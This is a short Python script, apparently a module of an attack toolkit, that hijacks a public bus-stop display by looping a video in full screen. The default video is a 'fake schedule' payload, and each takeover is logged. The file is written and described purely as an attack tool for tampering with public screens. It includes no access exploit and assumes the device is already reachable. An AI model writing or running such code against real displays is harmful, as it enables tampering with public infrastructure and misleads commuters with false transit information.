#!/usr/bin/env python3
# modules/attacks/bus_stop_screen_hijack.py

import argparse
import time
import os
import subprocess

LOG = "results/bus_screen_hijack.log"
DEFAULT_VIDEO = "payloads/loop_fake_schedule.mp4"

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")
    print(msg)

def hijack_display(video_path):
    try:
        subprocess.run(["mpv", "--fs", "--loop", "--no-audio", video_path], check=True)
        log(f"Hijacked screen with video: {video_path}")
    except Exception as e:
        log(f"[ERROR] Failed to hijack screen: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack bus stop public display with looped fake video")
    parser.add_argument("--video", default=DEFAULT_VIDEO, help="Path to video file to play on screen")
    args = parser.parse_args()
    hijack_display(args.video)
